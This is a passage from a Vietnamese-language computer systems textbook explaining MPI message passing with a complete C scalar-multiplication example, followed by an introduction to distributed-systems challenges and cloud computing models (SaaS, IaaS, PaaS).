Ví dụ này áp dụng <strong>mô hình boss/worker</strong> — một process đóng vai trò boss sẽ chia mảng thành các phần nhỏ hơn và phân phát cho các process worker.<br />
Lưu ý rằng trong phần cài đặt nhân vô hướng này, process boss cũng hoạt động như một worker và thực hiện nhân một phần mảng sau khi đã phân phát các phần khác cho các worker.</p>
<p>Để tận dụng lợi ích của việc xử lý song song, mỗi process chỉ nhân <strong>phần mảng cục bộ</strong> của mình với giá trị vô hướng, sau đó tất cả các worker gửi kết quả trở lại cho boss để tạo thành kết quả cuối cùng.<br />
Tại một số điểm trong chương trình, code sẽ kiểm tra xem <strong>rank</strong> của process có bằng 0 hay không:</p>
<pre><code class="language-c">if (rank == 0) {
    /* Đoạn code này chỉ chạy ở process boss. */
}
</code></pre>
<p>Việc kiểm tra này đảm bảo rằng chỉ <strong>một</strong> process (process có rank 0) đóng vai trò boss.<br />
Theo thông lệ, các ứng dụng MPI thường chọn rank 0 để thực hiện các tác vụ chỉ chạy một lần, vì bất kể có bao nhiêu process, luôn có một process được gán rank 0 (ngay cả khi chỉ chạy một process duy nhất).</p>
<h4 id="giao-tiếp-trong-mpi-mpi-communication"><a class="header" href="#giao-tiếp-trong-mpi-mpi-communication">Giao tiếp trong MPI (MPI Communication)</a></h4>
<p>Process boss bắt đầu bằng việc xác định giá trị vô hướng và mảng đầu vào ban đầu.<br />
Trong một ứng dụng tính toán khoa học thực tế, boss có thể đọc các giá trị này từ một tệp đầu vào.<br />
Để đơn giản hóa ví dụ, boss sử dụng một giá trị vô hướng cố định (10) và tạo ra một mảng 40 phần tử (chứa dãy số từ 0 đến 39) để minh họa.</p>
<p>Chương trình này yêu cầu giao tiếp giữa các process MPI cho ba nhiệm vụ quan trọng:</p>
<ol>
<li>Boss gửi giá trị vô hướng và kích thước mảng cho <strong>tất cả</strong> các worker.</li>
<li>Boss chia mảng ban đầu thành các phần và gửi mỗi phần cho một worker.</li>
<li>Mỗi worker nhân các giá trị trong phần mảng của mình với giá trị vô hướng, sau đó gửi các giá trị đã cập nhật trở lại cho boss.</li>
</ol>
<h4 id="phát-giá-trị-quan-trọng-broadcasting-important-values"><a class="header" href="#phát-giá-trị-quan-trọng-broadcasting-important-values">Phát giá trị quan trọng (Broadcasting Important Values)</a></h4>
<p>Để gửi giá trị vô hướng đến các worker, chương trình ví dụ sử dụng hàm <code>MPI_Bcast</code>, cho phép một process MPI gửi cùng một giá trị đến <strong>tất cả</strong> các process MPI khác chỉ với một lời gọi hàm:</p>
<pre><code class="language-c">/* Boss gửi giá trị vô hướng đến mọi process bằng broadcast. */
MPI_Bcast(&amp;scalar, 1, MPI_INT, 0, MPI_COMM_WORLD);
</code></pre>
<p>Lời gọi này gửi <strong>một số nguyên</strong> (<code>MPI_INT</code>), bắt đầu từ địa chỉ của biến <code>scalar</code>, từ process có rank 0 đến tất cả các process khác trong <strong>MPI_COMM_WORLD</strong>.<br />
Tất cả các process worker (có rank khác 0) sẽ nhận broadcast này vào bản sao cục bộ của biến <code>scalar</code>, vì vậy khi lời gọi này hoàn tất, mọi process đều biết giá trị vô hướng cần sử dụng.</p>
<blockquote>
<p><strong>Hành vi của MPI_Bcast</strong><br />
Mọi process đều thực thi <code>MPI_Bcast</code>, nhưng hành vi sẽ khác nhau tùy thuộc vào <strong>rank</strong> của process gọi hàm.<br />
Nếu rank trùng với tham số thứ tư, process đó đóng vai trò <strong>gửi</strong>.<br />
Tất cả các process khác gọi <code>MPI_Bcast</code> sẽ đóng vai trò <strong>nhận</strong>.</p>
</blockquote>
<p>Tương tự, <strong>boss</strong> sẽ broadcast (phát) kích thước tổng của mảng đến tất cả các process khác.<br />
Sau khi biết tổng kích thước mảng, mỗi process sẽ thiết lập biến <code>local_size</code> bằng cách chia tổng kích thước mảng cho số lượng process MPI.<br />
Biến <code>local_size</code> biểu thị số phần tử mà mỗi worker sẽ xử lý trong phần mảng được giao.</p>
<p>Ví dụ: nếu mảng đầu vào có 40 phần tử và ứng dụng gồm 8 process, thì mỗi process sẽ chịu trách nhiệm xử lý 5 phần tử của mảng (40 / 8 = 5).<br />
Để đơn giản, ví dụ này giả định rằng số lượng process chia hết cho kích thước mảng:</p>
<pre><code class="language-c">/* Mỗi process xác định tổng số process đang chạy. */
MPI_Comm_size(MPI_COMM_WORLD, &amp;process_count);

/* Boss gửi kích thước tổng của mảng đến mọi process bằng broadcast. */
MPI_Bcast(&amp;array_size, 1, MPI_INT, 0, MPI_COMM_WORLD);

/* Xác định số phần tử mảng mà mỗi process sẽ nhận.
 * Giả định mảng chia hết cho số lượng process. */
local_size = array_size / process_count;
</code></pre>
<h4 id="phân-phối-mảng-distributing-the-array"><a class="header" href="#phân-phối-mảng-distributing-the-array">Phân phối mảng (Distributing the Array)</a></h4>
<p>Bây giờ, khi mỗi process đã biết giá trị vô hướng và số phần tử mình phải nhân, <strong>boss</strong> cần chia mảng thành các phần và phân phát cho các worker.<br />
Lưu ý rằng trong cài đặt này, boss (rank 0) cũng tham gia như một worker.</p>
<p>Ví dụ: với mảng 40 phần tử và 8 process (rank 0–7), boss sẽ giữ các phần tử 0–4 cho mình (rank 0), gửi phần tử 5–9 cho rank 1, phần tử 10–14 cho rank 2, và cứ thế tiếp tục.<br />
Hình 2 minh họa cách boss phân chia các phần mảng cho từng process MPI.</p>
<p><img src="C15-Parallel/_images/ArrayDivision.png" alt="Each chunk of five array elements is distributed to the next process. For example, elements 0-4 are assigned to rank 0, elements 5-9 are assigned to rank 1, elements 10-14 are assigned to rank 2, and the patter continues until elements 35-39 are assigned to rank 7." /></p>
<p><strong>Hình 2.</strong> Phân phối mảng 40 phần tử cho 8 process MPI (rank 0–7)</p>
<p>Một cách để phân phối các phần mảng cho mỗi worker là kết hợp các lời gọi <code>MPI_Send</code> ở boss với một lời gọi <code>MPI_Recv</code> ở mỗi worker:</p>
<pre><code class="language-c">if (rank == 0) {
    int i;

    /* Với mỗi worker, gửi một phần mảng riêng biệt. */
    for (i = 1; i &lt; process_count; i++) {
        /* Gửi local_size số nguyên bắt đầu từ chỉ số (i * local_size) */
        MPI_Send(array + (i * local_size), local_size, MPI_INT, i, 0,
                 MPI_COMM_WORLD);
    }
} else {
    MPI_Recv(local_array, local_size, MPI_INT, 0, 0, MPI_COMM_WORLD,
             MPI_STATUS_IGNORE);
}
</code></pre>
<p>Trong đoạn code này, boss chạy một vòng lặp, mỗi vòng gửi cho một worker một phần mảng.<br />
Dữ liệu được gửi bắt đầu từ địa chỉ <code>array</code> với offset <code>(i * local_size)</code> để đảm bảo mỗi worker nhận một phần mảng duy nhất.<br />
Ví dụ: worker rank 1 nhận phần mảng bắt đầu từ chỉ số 5, rank 2 nhận từ chỉ số 10, v.v., như minh họa ở Hình 2.</p>
<p>Mỗi lời gọi <code>MPI_Send</code> gửi <code>local_size</code> (5) số nguyên (20 byte) đến process có rank <code>i</code>.<br />
Tham số <code>0</code> gần cuối là <strong>message tag</strong> (thẻ thông điệp) — một tính năng nâng cao mà chương trình này không cần, nên đặt là <code>0</code> để xử lý tất cả thông điệp như nhau.</p>
<p>Tất cả worker gọi <code>MPI_Recv</code> để nhận phần mảng của mình và lưu vào vùng nhớ mà <code>local_array</code> trỏ tới.<br />
Chúng nhận <code>local_size</code> (5) số nguyên (20 byte) từ node có rank 0.<br />
Lưu ý rằng <code>MPI_Recv</code> là một lời gọi <strong>blocking</strong> (chặn), nghĩa là process gọi nó sẽ tạm dừng cho đến khi nhận được dữ liệu.<br />
Vì <code>MPI_Recv</code> chặn, nên không worker nào tiếp tục xử lý cho đến khi boss gửi phần mảng của nó.</p>
<h4 id="thực-thi-song-song-parallel-execution"><a class="header" href="#thực-thi-song-song-parallel-execution">Thực thi song song (Parallel Execution)</a></h4>
<p>Sau khi worker nhận được phần mảng của mình, nó có thể bắt đầu nhân từng giá trị mảng với giá trị vô hướng.<br />
Vì mỗi worker nhận một tập con duy nhất của mảng, chúng có thể thực thi độc lập, song song, mà không cần giao tiếp thêm.</p>
<h4 id="tổng-hợp-kết-quả-aggregating-results"><a class="header" href="#tổng-hợp-kết-quả-aggregating-results">Tổng hợp kết quả (Aggregating Results)</a></h4>
<p>Cuối cùng, sau khi các worker hoàn tất phép nhân, chúng gửi các giá trị mảng đã cập nhật trở lại cho boss, và boss sẽ tổng hợp kết quả.<br />
Khi sử dụng <code>MPI_Send</code> và <code>MPI_Recv</code>, quá trình này trông tương tự như đoạn code phân phối mảng ở trên, chỉ khác là vai trò <strong>người gửi</strong> và <strong>người nhận</strong> được đảo ngược.</p>
<pre><code class="language-c">if (rank == 0) {
    int i;

    for (i = 1; i &lt; process_count; i++) {
        MPI_Recv(array + (i * local_size), local_size, MPI_INT, i, 0,
                 MPI_COMM_WORLD, MPI_STATUS_IGNORE);
    }
} else {
    MPI_Send(local_array, local_size, MPI_INT, 0, 0, MPI_COMM_WORLD);
}
</code></pre>
<p>Hãy nhớ rằng <code>MPI_Recv</code> là một lời gọi <strong>blocking</strong> (chặn) hoặc tạm dừng thực thi, vì vậy mỗi lần gọi trong vòng lặp <code>for</code> sẽ khiến <strong>boss</strong> phải chờ cho đến khi nhận được một phần mảng từ worker <em>i</em>.</p>
<h4 id="scattergather"><a class="header" href="#scattergather">Scatter/Gather</a></h4>
<p>Mặc dù các vòng lặp <code>for</code> trong ví dụ trước phân phối dữ liệu đúng cách bằng <code>MPI_Send</code> và <code>MPI_Recv</code>, nhưng chúng không thể hiện một cách ngắn gọn <strong>ý định</strong> đằng sau thao tác này.<br />
Nói cách khác, với MPI, chúng chỉ đơn thuần là một chuỗi các lời gọi gửi và nhận, mà không thể hiện rõ mục tiêu phân phối một mảng cho các process MPI.</p>
<p>Vì các ứng dụng song song thường xuyên cần phân phối và thu thập dữ liệu (như mảng trong ví dụ này), MPI cung cấp các hàm chuyên biệt cho mục đích này: <strong><code>MPI_Scatter</code></strong> và <strong><code>MPI_Gather</code></strong>.</p>
<p>Hai hàm này mang lại hai lợi ích chính:</p>
<ol>
<li>Cho phép toàn bộ các khối code ở trên được viết gọn lại thành <strong>một</strong> lời gọi hàm MPI duy nhất, giúp code ngắn gọn hơn.</li>
<li>Thể hiện <strong>ý định</strong> của thao tác cho trình triển khai MPI bên dưới, từ đó có thể tối ưu hóa hiệu năng tốt hơn.</li>
</ol>
<p>Để thay thế vòng lặp đầu tiên ở trên, mỗi process có thể gọi <code>MPI_Scatter</code>:</p>
<pre><code class="language-c">/* Boss phân tán các phần mảng đều nhau cho tất cả các process. */
MPI_Scatter(array, local_size, MPI_INT, local_array, local_size, MPI_INT,
            0, MPI_COMM_WORLD);
</code></pre>
<p>Hàm này sẽ tự động phân phối nội dung bộ nhớ bắt đầu tại <code>array</code> thành các phần có <code>local_size</code> số nguyên, và gửi đến biến đích <code>local_array</code>.<br />
Tham số <code>0</code> chỉ định rằng process có rank 0 (boss) là <strong>người gửi</strong>, do đó nó đọc và phân phối dữ liệu từ <code>array</code> đến các process khác (bao gồm cả việc gửi một phần cho chính nó).<br />
Mọi process khác đóng vai trò <strong>người nhận</strong> và nhận dữ liệu vào biến <code>local_array</code> của mình.</p>
<p>Sau lời gọi duy nhất này, các worker có thể nhân phần mảng của mình song song.<br />
Khi hoàn tất, mỗi process sẽ gọi <code>MPI_Gather</code> để tổng hợp kết quả trở lại biến <code>array</code> của boss:</p>
<pre><code class="language-c">/* Boss thu thập các phần mảng từ tất cả các process và hợp nhất
 * kết quả thành mảng cuối cùng. */
MPI_Gather(local_array, local_size, MPI_INT, array, local_size, MPI_INT,
           0, MPI_COMM_WORLD);
</code></pre>
<p>Lời gọi này hoạt động ngược lại với <code>MPI_Scatter</code>: lần này, tham số <code>0</code> chỉ định rằng process có rank 0 (boss) là <strong>người nhận</strong>, do đó nó sẽ cập nhật biến <code>array</code>, còn các worker sẽ gửi <code>local_size</code> số nguyên từ biến <code>local_array</code> của mình.</p>
<h4 id="mã-đầy-đủ-cho-mpi-scalar-multiply"><a class="header" href="#mã-đầy-đủ-cho-mpi-scalar-multiply">Mã đầy đủ cho MPI Scalar Multiply</a></h4>
<p>Dưới đây là code đầy đủ cho chương trình nhân vô hướng với MPI sử dụng <code>MPI_Scatter</code> và <code>MPI_Gather</code><br />
(<a href="C15-Parallel/_attachments/scalar_multiply_mpi.c">scalar_multiply_mpi.c</a>):</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;mpi.h&quot;

#define ARRAY_SIZE (40)
#define SCALAR (10)

/* In a real application, the boss process would likely read its input from a
 * data file.  This example program produces a simple array and informs the
 * caller of the size of the array through the array_size pointer parameter.*/
int *build_array(int *array_size) {
    int i;
    int *result = malloc(ARRAY_SIZE * sizeof(int));

    if (result == NULL) {
        exit(1);
    }

    for (i = 0; i &lt; ARRAY_SIZE; i++) {
        result[i] = i;
    }

    *array_size = ARRAY_SIZE;
    return result;
}

/* Print the elements of an array, given the array and its size. */
void print_array(int *array, int array_size) {
    int i;
    for (i = 0; i &lt; array_size; i++) {
        printf(&quot;%3d &quot;, array[i]);
    }
    printf(&quot;\n\n&quot;);
}

/* Multiply each element of an array by a scalar value. */
void scalar_multiply(int *array, int array_size, int scalar) {
    int i;
    for (i = 0; i &lt; array_size; i++) {
        array[i] = array[i] * scalar;
    }
}

int main(int argc, char **argv) {
    int rank, process_count;
    int array_size, local_size;
    int scalar;
    int *array, *local_array;

    /* Initialize MPI */
    MPI_Init(&amp;argc, &amp;argv);

    /* Determine how many processes there are and which one this is. */
    MPI_Comm_size(MPI_COMM_WORLD, &amp;process_count);
    MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank);

    /* Designate rank 0 to be the boss.  It sets up the problem by generating
     * the initial input array and choosing the scalar to multiply it by. */
    if (rank == 0) {
        array = build_array(&amp;array_size);
        scalar = SCALAR;

        printf(&quot;Initial array:\n&quot;);
        print_array(array, array_size);
    }

    /* Boss sends the scalar value to every process with a broadcast.
     * Worker processes receive the scalar value by making this MPI_Bcast
     * call. */
    MPI_Bcast(&amp;scalar, 1, MPI_INT, 0, MPI_COMM_WORLD);

    /* Boss sends the total array size to every process with a broadcast.
     * Worker processes receive the size value by making this MPI_Bcast
     * call. */
    MPI_Bcast(&amp;array_size, 1, MPI_INT, 0, MPI_COMM_WORLD);

    /* Determine how many array elements each process will get.
     * Assumes the array is evenly divisible by the number of processes. */
    local_size = array_size / process_count;

    /* Each process allocates space to store its portion of the array. */
    local_array = malloc(local_size * sizeof(int));
    if (local_array == NULL) {
        exit(1);
    }

    /* Boss scatters chunks of the array evenly among all the processes. */
    MPI_Scatter(array, local_size, MPI_INT, local_array, local_size, MPI_INT,
                0, MPI_COMM_WORLD);

    /* Every process (including boss) performs scalar multiplication over its
     * chunk of the array in parallel. */
    scalar_multiply(local_array, local_size, scalar);

    /* Boss gathers the chunks from all the processes and coalesces the
     * results into a final array. */
    MPI_Gather(local_array, local_size, MPI_INT, array, local_size, MPI_INT,
               0, MPI_COMM_WORLD);

    /* Boss prints the final answer. */
    if (rank == 0) {
        printf(&quot;Final array:\n&quot;);
        print_array(array, array_size);
    }

    /* Clean up. */
    if (rank == 0) {
        free(array);
    }
    free(local_array);
    MPI_Finalize();

    return 0;
}
</code></pre>
<p>Trong hàm <code>main</code>, boss thiết lập bài toán và tạo mảng.<br />
Nếu đây là một bài toán thực tế (ví dụ: ứng dụng tính toán khoa học), boss có thể đọc dữ liệu ban đầu từ một tệp đầu vào.<br />
Sau khi khởi tạo mảng, boss cần gửi thông tin về kích thước mảng và giá trị vô hướng dùng để nhân đến tất cả các worker, vì vậy nó <strong>broadcast</strong> các biến này đến mọi process.</p>
<p>Khi mỗi process đã biết kích thước mảng và số lượng process, chúng có thể tự tính toán để xác định số phần tử mình phải xử lý.<br />
Để đơn giản, code này giả định rằng mảng chia hết cho số lượng process.</p>
<p>Boss sau đó sử dụng hàm <code>MPI_Scatter</code> để gửi một phần mảng bằng nhau cho mỗi worker (bao gồm cả chính nó).<br />
Khi đã có đủ thông tin, mỗi worker sẽ thực hiện phép nhân trên phần mảng của mình song song.<br />
Cuối cùng, khi các worker hoàn tất, boss thu thập từng phần mảng từ các worker bằng <code>MPI_Gather</code> để tạo ra kết quả cuối cùng.</p>
<p>Quá trình biên dịch và chạy chương trình này như sau:</p>
<pre><code>$ mpicc -o scalar_multiply_mpi scalar_multiply_mpi.c
$ mpirun -np 8 --hostfile hosts.txt ./scalar_multiply_mpi
Initial array:
0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16  17  18  19
20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39

Final array:
0  10  20  30  40  50  60  70  80  90 100 110 120 130 140 150 160 170 180 190
200 210 220 230 240 250 260 270 280 290 300 310 320 330 340 350 360 370 380 390

</code></pre>
<h3 id="1526-những-thách-thức-của-hệ-thống-phân-tán-distributed-systems-challenges"><a class="header" href="#1526-những-thách-thức-của-hệ-thống-phân-tán-distributed-systems-challenges">15.2.6. Những thách thức của hệ thống phân tán (Distributed Systems Challenges)</a></h3>
<p>Nhìn chung, việc phối hợp hành vi của nhiều <strong>process</strong> trong các <strong>distributed system</strong> (hệ thống phân tán) là một nhiệm vụ nổi tiếng là khó khăn.<br />
Nếu một thành phần phần cứng (ví dụ: CPU hoặc bộ nguồn) bị hỏng trong <strong>shared memory system</strong> (hệ thống bộ nhớ chia sẻ), toàn bộ hệ thống sẽ ngừng hoạt động.<br />
Tuy nhiên, trong một hệ thống phân tán, các <strong>node</strong> độc lập có thể hỏng riêng lẻ.</p>
<p>Ví dụ: một ứng dụng phải quyết định cách tiếp tục nếu một node biến mất trong khi các node khác vẫn đang chạy.<br />
Tương tự, mạng liên kết giữa các node có thể gặp sự cố, khiến mỗi process tưởng rằng tất cả các process khác đều đã hỏng.</p>
<p>Hệ thống phân tán cũng gặp thách thức do thiếu phần cứng chia sẻ, đặc biệt là <strong>đồng hồ</strong> (clocks).<br />
Do độ trễ truyền mạng không thể dự đoán, các node độc lập không thể dễ dàng xác định thứ tự mà các thông điệp được gửi đi.</p>
<p>Việc giải quyết những thách thức này (và nhiều vấn đề khác) nằm ngoài phạm vi của cuốn sách này.<br />
May mắn thay, các nhà thiết kế phần mềm phân tán đã xây dựng nhiều <strong>framework</strong> giúp đơn giản hóa việc phát triển ứng dụng phân tán.<br />
Chúng ta sẽ mô tả một số framework này trong phần tiếp theo.</p>
<h3 id="tài-nguyên-mpi-mpi-resources"><a class="header" href="#tài-nguyên-mpi-mpi-resources">Tài nguyên MPI (MPI Resources)</a></h3>
<p>MPI là một tiêu chuẩn lớn và phức tạp, và phần này mới chỉ đề cập đến một phần rất nhỏ.<br />
Để tìm hiểu thêm về MPI, chúng tôi gợi ý:</p>
<ul>
<li><a href="https://hpc-tutorials.llnl.gov/mpi/">MPI tutorial</a> của <strong>Lawrence Livermore National Lab</strong>, tác giả Blaise Barney.</li>
<li><a href="http://selkie.macalester.edu/csinparallel/modules/Patternlets/build/html/MessagePassing/MPI_Patternlets.html">MPI Patterns</a> của <strong>CSinParallel</strong>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="153-tới-exascale-và-hơn-thế-nữa-Điện-toán-đám-mây-dữ-liệu-lớn-và-tương-lai-của-tính-toán"><a class="header" href="#153-tới-exascale-và-hơn-thế-nữa-Điện-toán-đám-mây-dữ-liệu-lớn-và-tương-lai-của-tính-toán">15.3. Tới Exascale và hơn thế nữa: Điện toán đám mây, Dữ liệu lớn và Tương lai của tính toán</a></h2>
<p>(<em>To Exascale and Beyond: Cloud Computing, Big Data, and the Future of Computing</em>)</p>
<p>Những tiến bộ trong công nghệ đã giúp con người có khả năng tạo ra dữ liệu với tốc độ chưa từng có.<br />
Các thiết bị khoa học như kính thiên văn, máy giải trình tự sinh học và cảm biến có thể tạo ra dữ liệu khoa học có độ chính xác cao với chi phí thấp.<br />
Khi các nhà khoa học phải vật lộn để phân tích “làn sóng dữ liệu” (<em>data deluge</em>) này, họ ngày càng dựa nhiều hơn vào các siêu máy tính đa node tinh vi, vốn là nền tảng của <strong>high-performance computing</strong> (HPC – tính toán hiệu năng cao).</p>
<p>Các ứng dụng HPC thường được viết bằng các ngôn ngữ như <strong>C</strong>, <strong>C++</strong> hoặc <strong>Fortran</strong>, với khả năng<br />
<a href="C15-Parallel/../C14-SharedMemory/multicore.html#_programming_multicore_systems">multithreading</a> và<br />
<a href="C15-Parallel/distrmem.html#_distributed_memory_systems_message_passing_and_mpi">message passing</a><br />
được hỗ trợ thông qua các thư viện như<br />
<a href="C15-Parallel/../C14-SharedMemory/posix.html#_hello_threading_writing_your_first_multithreaded_program">POSIX threads</a>,<br />
<a href="C15-Parallel/../C14-SharedMemory/openmp.html#_implicit_threading_with_openmp">OpenMP</a> và <strong>MPI</strong>.</p>
<p>Cho đến nay, phần lớn nội dung của cuốn sách này đã mô tả các đặc điểm kiến trúc, ngôn ngữ và thư viện thường được tận dụng trên các hệ thống HPC.<br />
Các công ty, phòng thí nghiệm quốc gia và các tổ chức quan tâm đến việc thúc đẩy khoa học thường sử dụng hệ thống HPC và tạo thành lõi của hệ sinh thái khoa học tính toán.</p>
<p>Trong khi đó, sự bùng nổ của các thiết bị kết nối internet và sự phổ biến của mạng xã hội đã khiến con người tạo ra một lượng lớn nội dung đa phương tiện trực tuyến một cách dễ dàng, dưới dạng trang web, hình ảnh, video, tweet và bài đăng mạng xã hội.<br />
Ước tính rằng <strong>90%</strong> tổng dữ liệu trực tuyến được tạo ra chỉ trong <strong>hai năm qua</strong>, và xã hội đang tạo ra <strong>30 terabyte dữ liệu người dùng mỗi giây</strong> (tương đương <strong>2,5 exabyte mỗi ngày</strong>).</p>
<p>Làn sóng <strong>dữ liệu người dùng</strong> này mang lại cho các công ty và tổ chức một kho thông tin khổng lồ về thói quen, sở thích và hành vi của người dùng, đồng thời hỗ trợ việc xây dựng hồ sơ khách hàng giàu dữ liệu để điều chỉnh sản phẩm và dịch vụ thương mại tốt hơn.</p>
<p>Để phân tích dữ liệu người dùng, các công ty thường dựa vào các <strong>trung tâm dữ liệu đa node</strong> (multinode data center) có nhiều thành phần kiến trúc phần cứng tương tự siêu máy tính.<br />
Tuy nhiên, các trung tâm dữ liệu này sử dụng một <strong>software stack</strong> khác, được thiết kế đặc biệt cho dữ liệu dựa trên internet.</p>
<p>Các hệ thống máy tính được sử dụng để lưu trữ và phân tích dữ liệu internet quy mô lớn đôi khi được gọi là <strong>high-end data analysis</strong> (HDA – phân tích dữ liệu cao cấp).<br />
Các công ty như Amazon, Google, Microsoft và Facebook có lợi ích trực tiếp trong việc phân tích dữ liệu internet và tạo thành lõi của hệ sinh thái phân tích dữ liệu.<br />
Cuộc cách mạng HDA và phân tích dữ liệu bắt đầu khoảng năm 2010 và hiện là một lĩnh vực chủ đạo trong nghiên cứu <strong>cloud computing</strong> (điện toán đám mây).</p>
<p>Hình 1 nêu bật những khác biệt chính trong phần mềm được sử dụng bởi cộng đồng HDA và HPC.<br />
Lưu ý rằng cả hai cộng đồng đều sử dụng phần cứng cụm (cluster hardware) tương tự, tuân theo mô hình<br />
<a href="C15-Parallel/distrmem.html#_distributed_memory_systems_message_passing_and_mpi">distributed memory</a>,<br />
trong đó mỗi <strong>compute node</strong> thường có một hoặc nhiều bộ xử lý<br />
<a href="C15-Parallel/../C14-SharedMemory/index.html#_leveraging_shared_memory_in_the_multicore_era">multicore</a><br />
và thường kèm theo GPU.</p>
<p>Phần cứng cụm thường bao gồm một <strong>distributed filesystem</strong> (hệ thống tệp phân tán) cho phép người dùng và ứng dụng truy cập chung vào các tệp nằm trên nhiều node trong cụm.</p>
<p><img src="C15-Parallel/_images/NewHPCHDAFigure.png" alt="High-end Data Analysis (HDA) vs High Performance Computing (HPC)." /></p>
<p><strong>Hình 1.</strong> So sánh các framework HDA và HPC. Dựa trên hình của Jack Dongarra và Daniel Reed.^8^</p>
<p>Không giống như siêu máy tính – vốn thường được xây dựng và tối ưu hóa cho mục đích HPC – cộng đồng HDA dựa vào <strong>data center</strong> (trung tâm dữ liệu), bao gồm một tập hợp lớn các compute node đa dụng, thường được kết nối mạng qua Ethernet.<br />
Ở cấp độ phần mềm, các trung tâm dữ liệu thường sử dụng <strong>máy ảo</strong> (virtual machine), <strong>cơ sở dữ liệu phân tán lớn</strong> và các <strong>framework</strong> cho phép phân tích dữ liệu internet với thông lượng cao.</p>
<p>Thuật ngữ <strong>cloud</strong> (đám mây) đề cập đến các thành phần lưu trữ dữ liệu và năng lực tính toán của các trung tâm dữ liệu HDA.</p>
<p>Trong phần này, chúng ta sẽ điểm qua <strong>cloud computing</strong>, một số phần mềm thường được sử dụng để triển khai cloud computing (đặc biệt là <strong>MapReduce</strong>), và một số thách thức trong tương lai.<br />
Lưu ý rằng phần này <strong>không</strong> nhằm mục đích đi sâu vào các khái niệm này; chúng tôi khuyến khích người đọc quan tâm tìm hiểu thêm từ các nguồn tham khảo được liệt kê.</p>
<h3 id="1531-cloud-computing"><a class="header" href="#1531-cloud-computing">15.3.1. Cloud Computing</a></h3>
<p><strong>Cloud computing</strong> (điện toán đám mây) là việc sử dụng hoặc thuê tài nguyên đám mây cho nhiều loại dịch vụ khác nhau.<br />
Cloud computing cho phép hạ tầng tính toán hoạt động như một <strong>dịch vụ tiện ích</strong> (<em>utility</em>): một số nhà cung cấp trung tâm cung cấp cho người dùng và tổ chức quyền truy cập (gần như vô hạn) vào sức mạnh tính toán thông qua internet, với việc người dùng và tổ chức lựa chọn sử dụng bao nhiêu tùy ý và trả tiền theo mức độ sử dụng.</p>
<p>Cloud computing có ba trụ cột chính:</p>
<ul>
<li><strong>Software as a Service (SaaS)</strong> – Phần mềm như một dịch vụ</li>
<li><strong>Infrastructure as a Service (IaaS)</strong> – Hạ tầng như một dịch vụ</li>
<li><strong>Platform as a Service (PaaS)</strong> – Nền tảng như một dịch vụ ^1^</li>
</ul>
<h4 id="software-as-a-service"><a class="header" href="#software-as-a-service">Software as a Service</a></h4>
<p><strong>Software as a Service</strong> (SaaS – Phần mềm như một dịch vụ) đề cập đến phần mềm được cung cấp trực tiếp cho người dùng thông qua <strong>cloud</strong> (đám mây).<br />
Hầu hết mọi người sử dụng trụ cột này của cloud computing mà thậm chí không nhận ra.<br />
Các ứng dụng mà nhiều người dùng hàng ngày (ví dụ: web mail, mạng xã hội, dịch vụ phát video trực tuyến) đều phụ thuộc vào hạ tầng cloud.</p>
<p>Hãy xét ví dụ kinh điển là dịch vụ web mail:<br />
Người dùng có thể đăng nhập và truy cập email của mình từ bất kỳ thiết bị nào, gửi và nhận thư, và dường như không bao giờ hết dung lượng lưu trữ.<br />
Các tổ chức quan tâm có thể “thuê” dịch vụ email trên cloud để cung cấp email cho khách hàng và nhân viên của mình, mà không phải chịu chi phí phần cứng và bảo trì khi tự vận hành dịch vụ.</p>
<p>Các dịch vụ thuộc trụ cột SaaS được quản lý hoàn toàn bởi nhà cung cấp cloud; tổ chức và người dùng (ngoài việc cấu hình một vài thiết lập nếu cần) không quản lý bất kỳ phần nào của ứng dụng, dữ liệu, phần mềm hay hạ tầng phần cứng — tất cả những thứ này sẽ cần thiết nếu họ tự triển khai dịch vụ trên phần cứng của mình.</p>
<p>Trước khi cloud computing ra đời, các tổ chức muốn cung cấp web mail cho người dùng sẽ cần có hạ tầng riêng và đội ngũ IT chuyên trách để duy trì.<br />
Ví dụ phổ biến về nhà cung cấp SaaS gồm <strong>Google’s G Suite</strong> và <strong>Microsoft Office 365</strong>.</p>
<h4 id="infrastructure-as-a-service"><a class="header" href="#infrastructure-as-a-service">Infrastructure as a Service</a></h4>
<p><strong>Infrastructure as a Service</strong> (IaaS – Hạ tầng như một dịch vụ) cho phép cá nhân và tổ chức “thuê” tài nguyên tính toán để đáp ứng nhu cầu của mình, thường dưới dạng truy cập <strong>máy ảo</strong> (virtual machine) — có thể là đa dụng hoặc được cấu hình sẵn cho một ứng dụng cụ thể.</p>
<p>Ví dụ kinh điển là dịch vụ <strong>Amazon Elastic Compute Cloud (EC2)</strong> của <strong>Amazon Web Services (AWS)</strong>.<br />
EC2 cho phép người dùng tạo máy ảo tùy chỉnh hoàn toàn.<br />
Thuật ngữ <strong>elastic</strong> (co giãn) trong EC2 đề cập đến khả năng của người dùng trong việc tăng hoặc giảm yêu cầu tài nguyên tính toán khi cần, và trả phí theo mức sử dụng.</p>
<p>Ví dụ: một tổ chức có thể sử dụng nhà cung cấp IaaS để lưu trữ website hoặc triển khai một loạt ứng dụng tùy chỉnh cho người dùng.<br />
Một số phòng thí nghiệm nghiên cứu và lớp học sử dụng dịch vụ IaaS thay cho máy trong phòng lab, chạy thí nghiệm trên cloud hoặc cung cấp nền tảng ảo cho sinh viên học tập.</p>
<p>Mục tiêu chung là loại bỏ chi phí bảo trì và đầu tư vốn để duy trì một cụm máy chủ hoặc server cá nhân cho các mục đích tương tự.<br />
Không giống SaaS, các trường hợp sử dụng IaaS yêu cầu khách hàng cấu hình ứng dụng, dữ liệu, và trong một số trường hợp là cả hệ điều hành của máy ảo.<br />
Tuy nhiên, hệ điều hành host và hạ tầng phần cứng được thiết lập và quản lý bởi nhà cung cấp cloud.</p>
<p>Các nhà cung cấp IaaS phổ biến gồm <strong>Amazon AWS</strong>, <strong>Google Cloud Services</strong> và <strong>Microsoft Azure</strong>.</p>
<h4 id="platform-as-a-service"><a class="header" href="#platform-as-a-service">Platform as a Service</a></h4>
<p><strong>Platform as a Service</strong> (PaaS – Nền tảng như một dịch vụ) cho phép cá nhân và tổ chức phát triển và triển khai ứng dụng web của riêng mình trên cloud, loại bỏ nhu cầu cấu hình hoặc bảo trì cục bộ.</p>
